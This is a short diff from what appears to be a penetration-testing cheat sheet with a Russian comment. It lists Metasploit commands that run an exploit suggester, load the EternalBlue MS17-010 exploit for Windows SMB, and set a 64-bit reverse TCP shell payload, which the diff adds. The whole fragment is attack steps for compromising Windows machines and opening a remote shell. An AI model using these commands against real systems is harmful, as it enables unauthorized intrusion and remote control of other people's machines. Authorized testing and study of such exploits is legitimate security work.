@@ -121,4 +121,8 @@ run post/multi/recon/local_exploit_suggester
 # eternalblue в метасплойт
 
 use exploit/windows/smb/ms17_010_eternalblue
+
    show payloads
+
+set payload windows/x64/shell/reverse_tcp
+
